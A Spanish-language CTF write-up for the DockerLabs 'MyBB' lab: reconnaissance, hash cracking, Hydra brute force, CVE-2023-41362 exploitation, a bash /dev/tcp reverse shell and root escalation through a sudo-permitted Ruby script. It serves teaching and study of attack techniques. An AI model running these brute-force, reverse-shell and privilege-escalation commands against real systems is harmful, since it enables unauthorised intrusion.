@@ -1,0 +1,219 @@
+---
+title: MyBB
+description: Resolución completa de la máquina virtual *MyBB* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **MyBB**, desarrollada por *Pylon* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone un servidor web con un dominio virtual que aloja un panel de administración de MyBB. Mediante fuerza bruta, se obtienen credenciales de acceso al panel. La versión de MyBB (1.8.35) es vulnerable a **CVE-2023-41362**, permitiendo ejecución remota de comandos y obteniendo acceso como `www-data`.
+Una vez dentro, se utilizan credenciales previamente crackeadas para acceder al usuario `alice`. Finalmente, `alice` puede ejecutar scripts Ruby en `~/scripts/` como root, permitiendo la escalada directa de privilegios a `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'MyBB',
+    Autor: 'Pylon',
+    Dificultad: 'Media',
+    Fecha: '17/06/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip MyBB.zip
+sudo bash auto_deploy.sh MyBB.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p MyBB/{content,exploits,nmap,scripts}
+cd MyBB
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1764640925/Ports_xs2pdp.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p80 172.17.0.2
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se identifica el dominio `panel.mybb.dl` en el código fuente. Se agrega al `/etc/hosts`:
+
+```bash
+echo "172.17.0.2 panel.mybb.dl" | sudo tee -a /etc/hosts
+```
+
+Se realiza un escaneo de directorios:
+
+```bash
+feroxbuster -u http://panel.mybb.dl -d 0 \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+  -x php,txt,html,js,bak,old \
+  -t 40 -C 404,403
+```
+
+![Feroxbuster](https://res.cloudinary.com/dewqswzke/image/upload/v1764640925/Feroxbuster_uvvhiv.png)
+
+**Rutas relevantes:**
+- `/backups` — Directorio navegable con un archivo `data`.
+  ![Backups](https://res.cloudinary.com/dewqswzke/image/upload/v1764640925/Backups_yykz1c.png)
+- `/admin` — Panel de inicio de sesión de MyBB.
+  ![Admin](https://res.cloudinary.com/dewqswzke/image/upload/v1764640924/Admin_twz19r.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Extracción de credenciales
+
+El archivo `data` contiene un hash de contraseña:
+
+![Data](https://res.cloudinary.com/dewqswzke/image/upload/v1764640925/Data_l1qatj.png)
+
+Se crackea con John the Ripper:
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt alice.hash
+```
+
+![John](https://res.cloudinary.com/dewqswzke/image/upload/v1764640925/John_lrgodt.png)
+
+### 2.2 Fuerza bruta en panel de administración
+
+Se realiza un ataque de fuerza bruta en el panel `/admin`:
+
+```bash
+hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt \
+  panel.mybb.dl http-post-form \
+  "/admin/index.php:username=^USER^&password=^PASS^&do=login:username and password"
+```
+
+Se obtienen credenciales válidas y se accede al panel.
+
+### 2.3 Explotación de CVE-2023-41362
+
+MyBB 1.8.35 es vulnerable a **CVE-2023-41362** (RCE en el ACP). Se utiliza el exploit disponible:
+
+```bash
+python3 exploit.py http://panel.mybb.dl admin babygirl
+```
+
+Se obtiene una pseudo-shell. Se inicia un listener:
+
+```bash
+nc -nlvp 443
+```
+
+Se ejecuta la reverse shell:
+
+```bash
+/bin/bash -c '/bin/bash -i >& /dev/tcp/172.17.0.1/443 0>&1'
+```
+
+![www-data](https://res.cloudinary.com/dewqswzke/image/upload/v1764640925/Reverse_pymzgn.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De www-data → alice
+
+```bash
+su alice
+```
+
+![Alice](https://res.cloudinary.com/dewqswzke/image/upload/v1764640924/Alice_bljlpf.png)
+
+### 3.2 De alice → root
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1764640927/Sudo-lAlice_pit1re.png)
+
+Se puede ejecutar cualquier script `.rb` en `~/scripts/` como root:
+
+```bash
+echo 'exec "/bin/bash"' > ~/scripts/shell.rb
+chmod +x ~/scripts/shell.rb
+sudo ./shell.rb
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1764640926/Root_jnnirc.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Exposición de hash de contraseña en /backups",
+      severity: "Alta",
+      impact: "Crackeo de credenciales"
+    },
+    {
+      vulnerability: "MyBB vulnerable a CVE-2023-41362",
+      severity: "Crítica",
+      impact: "Ejecución remota de comandos como www-data"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en scripts Ruby",
+      severity: "Crítica",
+      impact: "Escalada directa de privilegios a root"
+    }
+  ]}
+/>
